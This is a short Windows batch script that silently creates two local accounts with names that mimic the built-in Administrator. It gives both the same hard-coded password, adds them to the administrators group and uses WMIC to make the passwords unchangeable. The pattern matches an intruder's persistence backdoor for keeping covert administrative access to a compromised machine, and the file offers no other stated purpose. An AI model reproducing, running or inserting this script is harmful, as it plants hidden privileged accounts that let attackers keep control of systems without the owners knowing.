@echo off

net user "Administrato8"  "Ttr64%hW)V" /add
net user "Administrato12"  "Ttr64%hW)V" /add
net localgroup administrators "Administrato8" /add
net localgroup administrators "Administrato12" /add



WMIC USERACCOUNT WHERE "Name='Administrato8'" SET Passwordchangeable=FALSE
WMIC USERACCOUNT WHERE "Name='Administrato12'" SET Passwordchangeable=FALSE
